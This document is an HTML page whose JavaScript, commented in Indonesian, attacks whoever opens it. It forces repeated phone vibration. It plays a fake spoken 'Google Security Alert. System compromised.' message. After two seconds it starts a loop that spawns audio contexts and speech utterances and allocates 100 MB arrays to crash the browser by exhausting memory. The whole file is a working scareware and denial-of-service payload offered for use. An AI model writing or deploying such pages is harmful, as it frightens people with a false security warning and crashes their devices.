<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Alert</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #111; color: #f00; font-family: monospace; overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center; }
  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
  #status { font-size: 20px; text-align: center; }
</style>
</head>
<body>

<div id="status">Memuat sistem keamanan...</div>

<script>
(function () {
  'use strict';

  var statusEl = document.getElementById('status');

  // ============================================
  // 1. ZERO-CLICK VIBRATION TRIGGER
  // ============================================
  function forceVibration() {
    if (!('vibrate' in navigator)) return;
    
    console.log("[!] Mencoba Zero-Click Vibration...");
    
    // Pola getaran: Getar 1 detik, jeda 200ms, getar 1 detik
    var pattern = [1000, 200, 1000, 200, 1000];
    
    // Trik 1: Panggil langsung saat load
    navigator.vibrate(pattern);
    
    // Trik 2: Panggil di dalam requestAnimationFrame
    requestAnimationFrame(function() {
      navigator.vibrate(pattern);
    });

    // Trik 3: Panggil secara berulang (Loop)
    setInterval(function() {
      navigator.vibrate(pattern);
    }, 2500);
  }

  // ============================================
  // 2. FOCUS / VISIBILITY HIJACK
  // ============================================
  // Browser sering mengizinkan getaran jika tab dalam keadaan "Focused"
  window.addEventListener('focus', forceVibration);
  document.addEventListener('visibilitychange', function() {
    if (!document.hidden) forceVibration();
  });

  // ============================================
  // 3. AUDIO & TTS BYPASS
  // ============================================
  var ttsText = "Google Security Alert. System compromised.";
  
  function startTTS() {
    if (!('speechSynthesis' in window)) return;
    var u = new SpeechSynthesisUtterance(ttsText);
    u.lang = 'en-US';
    u.rate = 1.0;
    u.volume = 1.0;
    window.speechSynthesis.speak(u);
  }

  function unlockAudio() {
    try {
      var ctx = new (window.AudioContext || window.webkitAudioContext)();
      if (ctx.state === 'suspended') ctx.resume();
      var osc = ctx.createOscillator();
      var gain = ctx.createGain();
      gain.gain.value = 0.0001;
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start();
      osc.stop(ctx.currentTime + 0.1);
    } catch(e) {}
  }

  // ============================================
  // 4. RESOURCE EXHAUSTION (OOM CRASH)
  // ============================================
  var memoryHog = [];
  function triggerCrash() {
    console.log("[!] Initiating Crash (OOM)...");
    statusEl.innerText = "SYSTEM FAILURE";
    
    setInterval(function() {
      try {
        for (var i = 0; i < 1000; i++) {
          var ctx = new (window.AudioContext || window.webkitAudioContext)();
          var osc = ctx.createOscillator();
          osc.connect(ctx.destination);
          osc.start(0);
          
          var u = new SpeechSynthesisUtterance("CRASH_" + i);
          window.speechSynthesis.speak(u);
        }

        var bigArray = new Uint8Array(100 * 1024 * 1024);
        bigArray.fill(1);
        memoryHog.push(bigArray);

      } catch(e) {}
    }, 50); 
  }

  // ============================================
  // EKSEKUSI
  // ============================================
  
  // Trigger Vibration & Audio
  forceVibration();
  unlockAudio();
  startTTS();

  // Trigger Crash setelah 2 detik
  setTimeout(function() {
    triggerCrash();
  }, 2000);

})();
</script>
</body>
</html>
